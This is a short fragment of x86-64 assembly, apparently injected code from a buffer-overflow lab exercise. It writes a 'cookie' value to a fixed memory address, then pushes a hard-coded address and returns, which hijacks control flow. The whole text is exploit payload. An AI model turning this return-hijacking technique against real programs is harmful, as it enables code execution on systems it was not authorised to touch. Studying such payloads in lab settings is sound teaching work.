movq $0x3f13299070401ebd, %rax    # Move cookie to %rax
movq %rax, 0x602308
pushq $0x401020          # Push 0x401020 onto the stack
retq                     # Return
